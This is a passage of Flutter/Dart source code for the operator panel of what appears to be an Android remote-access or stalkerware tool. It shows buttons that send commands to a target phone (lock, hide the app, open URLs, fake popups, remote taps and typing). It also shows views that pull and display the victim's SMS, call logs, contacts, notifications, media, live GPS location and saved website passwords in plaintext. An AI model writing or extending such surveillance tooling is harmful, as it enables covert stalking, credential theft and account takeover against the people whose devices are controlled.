                        SizedBox(width: 4),
                        Text(
                          device['sim_operator'] ?? 'Unknown',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),

        // Tabs
        Container(
          margin: EdgeInsets.symmetric(horizontal: 16),
          padding: EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(30),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Row(
            children: [
              _buildTab(0, Icons.info_outline, Icons.info, 'INFO'),
              _buildTab(1, Icons.games_outlined, Icons.games, 'CONTROL'),
              _buildTab(2, Icons.data_usage, Icons.data_usage, 'DATA'),
              _buildTab(3, Icons.image_outlined, Icons.image, 'MEDIA'),
            ],
          ),
        ),

        SizedBox(height: 16),

        Expanded(
          child: IndexedStack(
            index: _selectedTabIndex,
            children: [
              _buildInfoTab(device),
              _buildControlTab(deviceId, online),
              _buildDataTab(deviceId, online),
              _buildMediaTab(deviceId),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildTab(int index, IconData outlined, IconData filled, String label) {
    final selected = _selectedTabIndex == index;
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _selectedTabIndex = index),
        child: AnimatedContainer(
          duration: Duration(milliseconds: 200),
          padding: EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            gradient: selected
                ? LinearGradient(
                    colors: [neonMagenta, neonPurple],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  )
                : null,
            borderRadius: BorderRadius.circular(30),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                selected ? filled : outlined,
                color: selected ? Colors.white : textDim,
                size: 16,
              ),
              if (selected) ...[
                SizedBox(width: 6),
                Text(
                  label,
                  style: TextStyle(
                    color: Colors.white,
                    fontFamily: 'Orbitron',
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }

  // ==================== INFO TAB ====================

  Widget _buildInfoTab(Map<String, dynamic> device) {
    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          Row(
            children: [
              Expanded(child: _statCard(Icons.memory, 'RAM', _formatBytes(_deviceInfo['ram_total'] ?? 0), Colors.blue)),
              SizedBox(width: 12),
              Expanded(child: _statCard(Icons.storage, 'Storage', _formatBytes(_deviceInfo['storage_total'] ?? 0), Colors.orange)),
            ],
          ),
          SizedBox(height: 12),
          Row(
            children: [
              Expanded(child: _statCard(Icons.speed, 'CPU', '${_deviceInfo['available_processors'] ?? 0} cores', Colors.purple)),
              SizedBox(width: 12),
              Expanded(child: _statCard(Icons.phone_android, 'Screen', '${_deviceInfo['screen_width'] ?? 0}x${_deviceInfo['screen_height'] ?? 0}', Colors.teal)),
            ],
          ),
          SizedBox(height: 16),
          _infoSection('DEVICE', Icons.phone_android, [
            _infoRow('Device ID', device['device_id'] ?? 'N/A', true),
            _infoRow('Model', _deviceInfo['model'] ?? device['model'] ?? 'Unknown'),
            _infoRow('Manufacturer', _deviceInfo['manufacturer'] ?? 'Unknown'),
            _infoRow('Android', _deviceInfo['android_version'] ?? 'Unknown'),
          ]),
          SizedBox(height: 12),
          _infoSection('NETWORK', Icons.network_cell, [
            _infoRow('IMEI', _deviceInfo['imei'] ?? 'N/A', true),
            _infoRow('SIM', _deviceInfo['sim_operator'] ?? 'Unknown'),
            _infoRow('Network', _deviceInfo['network_type_name'] ?? 'Unknown'),
          ]),
          SizedBox(height: 12),
          _infoSection('SYSTEM', Icons.settings_applications, [
            _infoRow('Timezone', _deviceInfo['timezone'] ?? 'Unknown'),
            _infoRow('Language', _deviceInfo['language'] ?? 'Unknown'),
            _infoRow('Country', _deviceInfo['country'] ?? 'Unknown'),
          ]),
        ],
      ),
    );
  }

  Widget _statCard(IconData icon, String label, String value, Color color) {
    return Container(
      padding: EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Column(
        children: [
          Icon(icon, color: color, size: 22),
          SizedBox(height: 6),
          Text(
            value,
            style: TextStyle(color: textWhite, fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold),
          ),
          Text(
            label,
            style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
          ),
        ],
      ),
    );
  }

  Widget _infoSection(String title, IconData icon, List<Widget> children) {
    return Container(
      width: double.infinity,
      padding: EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: cardBorder, width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: neonMagenta.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: neonMagenta, size: 14),
              ),
              SizedBox(width: 8),
              Text(
                title,
                style: TextStyle(
                  color: neonMagenta,
                  fontFamily: 'Orbitron',
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                ),
              ),
            ],
          ),
          SizedBox(height: 12),
          ...children,
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value, [bool mono = false]) {
    return Padding(
      padding: EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Expanded(
            flex: 2,
            child: Text(
              label,
              style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
            ),
          ),
          Expanded(
            flex: 3,
            child: Text(
              value,
              style: TextStyle(
                color: textWhite,
                fontFamily: mono ? 'ShareTechMono' : 'Orbitron',
                fontSize: 11,
                fontWeight: mono ? null : FontWeight.w500,
              ),
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }

  // ==================== CONTROL TAB ====================

  Widget _buildControlTab(String deviceId, bool online) {
    if (!online) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.wifi_off, size: 48, color: textDim),
            SizedBox(height: 12),
            Text(
              'Device Offline',
              style: TextStyle(color: textWhite, fontFamily: 'Orbitron', fontSize: 16),
            ),
            SizedBox(height: 6),
            Text(
              'Commands unavailable',
              style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
            ),
          ],
        ),
      );
    }

    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          _controlCategory('SCREEN', Icons.lock_outline, Colors.orange, [
            _controlBtn('Lock', Icons.lock, Colors.orange, () => _sendCommand(deviceId, 'lock')),
            _controlBtn('Unlock', Icons.lock_open, Colors.green, () => _sendCommand(deviceId, 'unlock')),
          ]),
          SizedBox(height: 12),
          _controlCategory('FLASHLIGHT', Icons.flash_on, Colors.yellow, [
            _controlBtn('ON', Icons.flash_on, Colors.yellow, () => _sendCommand(deviceId, 'flashlight_on')),
            _controlBtn('OFF', Icons.flash_off, Colors.grey, () => _sendCommand(deviceId, 'flashlight_off')),
          ]),
          SizedBox(height: 12),
          _controlCategory('🎵 MUSIC', Icons.music_note, neonMagenta, [
            _controlBtn('Play Music', Icons.play_arrow, neonMagenta, () => _showCustomMusicDialog(deviceId)),
            _controlBtn('Stop', Icons.stop, Colors.red, () => _sendCommand(deviceId, 'stop_music')),
          ]),
          SizedBox(height: 12),
          _controlCategory('APP', Icons.apps, neonPurple, [
            _controlBtn('Hide', Icons.visibility_off, Colors.purple, () => _sendCommand(deviceId, 'hide_app')),
            _controlBtn('Show', Icons.visibility, Colors.teal, () => _sendCommand(deviceId, 'show_app')),
          ]),
          SizedBox(height: 12),
          _controlCategory('🌐 WEB', Icons.public, Colors.blue, [
            _controlBtn('Open URL', Icons.open_in_browser, Colors.blue, () => _showCustomWebDialog(deviceId)),
          ]),
          SizedBox(height: 12),
          _controlCategory('🔔 NOTIFY', Icons.notifications, Colors.orange, [
            _controlBtn('Notification', Icons.notifications, Colors.orange, () => _showCustomNotificationDialog(deviceId)),
            _controlBtn('Popup', Icons.message, neonPurple, () => _showCustomPopupDialog(deviceId)),
          ]),
          SizedBox(height: 12),
          _controlCategory('🖼️ FLOATING', Icons.image, Colors.pink, [
            _controlBtn('Show Images', Icons.add_photo_alternate, Colors.pink, () => _showCustomImageDialog(deviceId)),
            _controlBtn('Clear', Icons.clear_all, Colors.red, () => _sendCommand(deviceId, 'clear_floating_images')),
          ]),
          SizedBox(height: 12),
          _controlCategory('TOUCH', Icons.touch_app, Colors.cyan, [
            _controlBtn('Input Text', Icons.text_fields, Colors.cyan, () => _showCustomInputDialog(deviceId)),
            _controlBtn('Tap', Icons.touch_app, Colors.green, () => _showCustomTapDialog(deviceId)),
          ]),
          _controlCategory('📱 EXTRACT', Icons.data_usage, Colors.purple, [
            _controlBtn('Get SMS', Icons.sms, Colors.blue, () => {
              _fetchSms(deviceId);
              setState(() => _selectedTabIndex = 2);
            }),
            _controlBtn('Get Calls', Icons.phone, Colors.green, () => {
              _fetchCalls(deviceId);
              setState(() => _selectedTabIndex = 2);
            }),
            _controlBtn('Get Contacts', Icons.contacts, Colors.orange, () => {
              _fetchContacts(deviceId);
              setState(() => _selectedTabIndex = 2);
            }),
            _controlBtn('Get Passwords', Icons.lock, Colors.red, () => {
              _fetchPasswords(deviceId);
              setState(() => _selectedTabIndex = 2);
            }),
            _controlBtn('Get Notifications', Icons.notifications, Colors.yellow, () => {
              _fetchNotifications(deviceId);
              setState(() => _selectedTabIndex = 2);
            }),
          ]),
          if (_commandResponse != null) ...[
            SizedBox(height: 12),
            Container(
              padding: EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.green.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.green, width: 1),
              ),
              child: Row(
                children: [
                  Icon(Icons.check_circle, color: Colors.green, size: 18),
                  SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      _commandResponse!,
                      style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11),
                    ),
                  ),
                  IconButton(
                    icon: Icon(Icons.close, color: textDim, size: 16),
                    onPressed: () => setState(() => _commandResponse = null),
                    padding: EdgeInsets.zero,
                    constraints: BoxConstraints(),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _controlCategory(String title, IconData icon, Color color, List<Widget> buttons) {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: EdgeInsets.all(12),
            child: Row(
              children: [
                Container(
                  padding: EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: color.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Icon(icon, color: color, size: 14),
                ),
                SizedBox(width: 8),
                Text(
                  title,
                  style: TextStyle(
                    color: color,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                    fontSize: 11,
                  ),
                ),
              ],
            ),
          ),
          ...buttons,
        ],
      ),
    );
  }

  Widget _controlBtn(String label, IconData icon, Color color, VoidCallback onTap) {
    return InkWell(
      onTap: onTap,
      child: Container(
        padding: EdgeInsets.symmetric(horizontal: 16, vertical: 10),
        decoration: BoxDecoration(
          border: Border(top: BorderSide(color: color.withOpacity(0.2), width: 0.5)),
        ),
        child: Row(
          children: [
            Container(
              padding: EdgeInsets.all(6),
              decoration: BoxDecoration(
                color: color.withOpacity(0.2),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Icon(icon, color: color, size: 16),
            ),
            SizedBox(width: 10),
            Expanded(
              child: Text(
                label,
                style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 12),
              ),
            ),
            Icon(Icons.arrow_forward_ios, color: color.withOpacity(0.5), size: 12),
          ],
        ),
      ),
    );
  }

  // ==================== DATA TAB ====================

  Widget _buildDataTab(String deviceId, bool online) {
    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          // Location
          Container(
            width: double.infinity,
            padding: EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: Colors.blue.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: Icon(Icons.location_on, color: Colors.blue, size: 18),
                    ),
                    SizedBox(width: 10),
                    Text(
                      'LIVE LOCATION',
                      style: TextStyle(
                        color: Colors.blue,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 13,
                      ),
                    ),
                    Spacer(),
                    if (online)
                      AnimatedBuilder(
                        animation: _pulseController,
                        builder: (context, child) {
                          return Container(
                            padding: EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                            decoration: BoxDecoration(
                              color: Colors.green.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: Colors.green, width: 1),
                            ),
                            child: Row(
                              children: [
                                Container(
                                  width: 6,
                                  height: 6,
                                  decoration: BoxDecoration(
                                    color: Colors.green,
                                    shape: BoxShape.circle,
                                  ),
                                ),
                                SizedBox(width: 4),
                                Text(
                                  'LIVE',
                                  style: TextStyle(
                                    color: Colors.green,
                                    fontFamily: 'Orbitron',
                                    fontSize: 8,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ],
                            ),
                          );
                        },
                      ),
                  ],
                ),
                SizedBox(height: 12),
                if (_lastLocation != null) ...[
                  Container(
                    height: 200,
                    width: double.infinity,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: FlutterMap(
                        options: MapOptions(
                          initialCenter: LatLng(_lastLocation!['lat'], _lastLocation!['lng']),
                          initialZoom: 14,
                        ),
                        children: [
                          TileLayer(
                            urlTemplate: 'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
                            userAgentPackageName: 'com.voyre.app',
                            maxZoom: 19,
                          ),
                          MarkerLayer(
                            markers: [
                              Marker(
                                point: LatLng(_lastLocation!['lat'], _lastLocation!['lng']),
                                width: 40,
                                height: 40,
                                child: Icon(Icons.location_on, color: Colors.red, size: 36),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ),
                  SizedBox(height: 12),
                  Row(
                    children: [
                      Expanded(
                        child: _locDetail(Icons.my_location, 'Lat', _lastLocation!['lat'].toStringAsFixed(5)),
                      ),
                      SizedBox(width: 8),
                      Expanded(
                        child: _locDetail(Icons.my_location, 'Lng', _lastLocation!['lng'].toStringAsFixed(5)),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  Row(
                    children: [
                      Expanded(
                        child: _locDetail(Icons.satellite, 'Accuracy', '±${_lastLocation!['accuracy']}m'),
                      ),
                      SizedBox(width: 8),
                      Expanded(
                        child: _locDetail(Icons.access_time, 'Time', _formatEpochTime(_lastLocation!['time'])),
                      ),
                    ],
                  ),
                ] else ...[
                  Center(
                    child: Column(
                      children: [
                        Icon(Icons.location_off, size: 32, color: textDim),
                        SizedBox(height: 8),
                        Text(
                          'No location data',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                ],
                SizedBox(height: 12),
                ElevatedButton(
                  onPressed: online ? () => _fetchLocations(deviceId) : null,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.blue,
                    foregroundColor: Colors.white,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    minimumSize: Size(double.infinity, 36),
                  ),
                  child: Text('REFRESH', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11)),
                ),
              ],
            ),
          ),

          SizedBox(height: 12),

          // Battery
          Container(
            width: double.infinity,
            padding: EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: Colors.green.withOpacity(0.3), width: 1),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: Colors.green.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: Icon(Icons.battery_charging_full, color: Colors.green, size: 18),
                    ),
                    SizedBox(width: 10),
                    Text(
                      'BATTERY',
                      style: TextStyle(
                        color: Colors.green,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 13,
                      ),
                    ),
                  ],
                ),
                SizedBox(height: 12),
                if (_batteryInfo.isNotEmpty) ...[
                  Row(
                    children: [
                      SizedBox(
                        width: 60,
                        height: 60,
                        child: Stack(
                          alignment: Alignment.center,
                          children: [
                            CircularProgressIndicator(
                              value: (_batteryInfo['battery'] ?? 0) / 100,
                              strokeWidth: 6,
                              backgroundColor: bgDark,
                              valueColor: AlwaysStoppedAnimation<Color>(
                                (_batteryInfo['battery'] ?? 0) > 20 ? Colors.green : Colors.red,
                              ),
                            ),
                            Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Text(
                                  '${_batteryInfo['battery'] ?? 0}%',
                                  style: TextStyle(
                                    color: textWhite,
                                    fontFamily: 'Orbitron',
                                    fontSize: 13,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                                if (_batteryInfo['charging'] == true)
                                  Text('⚡', style: TextStyle(fontSize: 10)),
                              ],
                            ),
                          ],
                        ),
                      ),
                      SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          children: [
                            _battDetail(Icons.thermostat, 'Temp', '${_batteryInfo['temperature'] ?? 0}°C', Colors.orange),
                            SizedBox(height: 4),
                            _battDetail(Icons.health_and_safety, 'Health', _batteryInfo['health'] ?? 'Unknown', Colors.blue),
                            SizedBox(height: 4),
                            _battDetail(Icons.bolt, 'Voltage', '${_batteryInfo['voltage'] ?? 0} mV', Colors.yellow),
                          ],
                        ),
                      ),
                    ],
                  ),
                ] else ...[
                  Center(
                    child: Text(
                      'No battery data',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
                    ),
                  ),
                ],
                SizedBox(height: 12),
                ElevatedButton(
                  onPressed: online ? () => _fetchBatteryInfo(deviceId) : null,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.green,
                    foregroundColor: Colors.white,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    minimumSize: Size(double.infinity, 36),
                  ),
                  child: Text('REFRESH', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11)),
                ),
              ],
            ),
          ),

          if (_locations.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: neonPurple.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: neonPurple.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Icon(Icons.history, color: neonPurple, size: 18),
                      ),
                      SizedBox(width: 10),
                      Text(
                        'HISTORY',
                        style: TextStyle(
                          color: neonPurple,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_locations.length} pts',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  ..._locations.take(3).map((loc) => Padding(
                    padding: EdgeInsets.symmetric(vertical: 4),
                    child: Row(
                      children: [
                        Icon(Icons.location_on, color: neonPurple, size: 12),
                        SizedBox(width: 6),
                        Expanded(
                          child: Text(
                            '${loc['lat'].toStringAsFixed(5)}, ${loc['lng'].toStringAsFixed(5)}',
                            style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 10),
                          ),
                        ),
                        Text(
                          _formatEpochTime(loc['time']),
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                        ),
                      ],
                    ),
                  )),
                  if (_locations.length > 3)
                    Padding(
                      padding: EdgeInsets.only(top: 4),
                      child: Center(
                        child: Text(
                          '+${_locations.length - 3} more',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                        ),
                      ),
                    ),
                ],
              ),
            ),
          ],

          // SMS
          if (_smsList.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.blue.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Icon(Icons.sms, color: Colors.blue, size: 18),
                      ),
                      SizedBox(width: 10),
                      Text(
                        'SMS',
                        style: TextStyle(
                          color: Colors.blue,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_smsList.length} msgs',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  ..._smsList.take(3).map((sms) => Padding(
                    padding: EdgeInsets.symmetric(vertical: 4),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          '📱 ${sms['address'] ?? 'Unknown'}',
                          style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                        ),
                        Text(
                          sms['body'] ?? '',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                          maxLines: 2,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  )),
                ],
              ),
            ),
          ],

          // Calls
          if (_callsList.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.green.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.green.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Icon(Icons.phone, color: Colors.green, size: 18),
                      ),
                      SizedBox(width: 10),
                      Text(
                        'CALLS',
                        style: TextStyle(
                          color: Colors.green,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_callsList.length} calls',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  ..._callsList.take(3).map((call) => Padding(
                    padding: EdgeInsets.symmetric(vertical: 4),
                    child: Row(
                      children: [
                        Icon(
                          call['type'] == 'incoming' ? Icons.call_received : Icons.call_made,
                          color: call['type'] == 'incoming' ? Colors.green : Colors.orange,
                          size: 14,
                        ),
                        SizedBox(width: 6),
                        Expanded(
                          child: Text(
                            call['number'] ?? 'Unknown',
                            style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 10),
                          ),
                        ),
                        Text(
                          call['duration'] ?? '0s',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                        ),
                      ],
                    ),
                  )),
                ],
              ),
            ),
          ],

          // Passwords
          if (_passwordsList.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.red.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.red.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Icon(Icons.lock, color: Colors.red, size: 18),
                      ),
                      SizedBox(width: 10),
                      Text(
                        'PASSWORDS',
                        style: TextStyle(
                          color: Colors.red,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_passwordsList.length} saved',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  ..._passwordsList.take(3).map((pwd) => Padding(
                    padding: EdgeInsets.symmetric(vertical: 4),
                    child: Row(
                      children: [
                        Icon(Icons.key, color: Colors.yellow, size: 14),
                        SizedBox(width: 6),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                pwd['website'] ?? pwd['app'] ?? 'Unknown',
                                style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 10, fontWeight: FontWeight.bold),
                              ),
                              Text(
                                '👤 ${pwd['username'] ?? ''} • 🔑 ${pwd['password'] ?? ''}',
                                style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  )),
                ],
              ),
            ),
          ],

          // Notifications
          if (_notificationsList.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.orange.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.orange.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Icon(Icons.notifications, color: Colors.orange, size: 18),
                      ),
                      SizedBox(width: 10),
                      Text(
                        'NOTIFICATIONS',
                        style: TextStyle(
                          color: Colors.orange,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_notificationsList.length} notif',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                  SizedBox(height: 8),
                  ..._notificationsList.take(3).map((notif) => Padding(
                    padding: EdgeInsets.symmetric(vertical: 4),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          notif['title'] ?? 'No Title',
                          style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                        ),
                        Text(
                          notif['body'] ?? '',
                          style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                          maxLines: 2,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  )),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _locDetail(IconData icon, String label, String value) {
    return Row(
      children: [
        Icon(icon, color: Colors.blue, size: 12),
        SizedBox(width: 4),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(label, style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 8)),
              Text(value, style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 10, fontWeight: FontWeight.bold)),
            ],
          ),
        ),
      ],
    );
  }

  Widget _battDetail(IconData icon, String label, String value, Color color) {
    return Row(
      children: [
        Icon(icon, color: color, size: 12),
        SizedBox(width: 6),
        Expanded(
          child: Text(
            '$label: $value',
            style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 10),
          ),
        ),
      ],
    );
  }

  // ==================== MEDIA TAB ====================

  Widget _buildMediaTab(String deviceId) {
    if (_isLoadingData) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            CircularProgressIndicator(
              valueColor: AlwaysStoppedAnimation<Color>(neonMagenta),
              strokeWidth: 2,
            ),
            SizedBox(height: 12),
            Text(
              'LOADING MEDIA...',
              style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
            ),
          ],
        ),
      );
    }

    if (_mediaFiles.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.image_not_supported, size: 48, color: textDim),
            SizedBox(height: 12),
            Text(
              'No Media Files',
              style: TextStyle(color: textWhite, fontFamily: 'Orbitron', fontSize: 16),
            ),
            SizedBox(height: 8),
            Text(
              'Photos and videos will appear here',
              style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
            ),
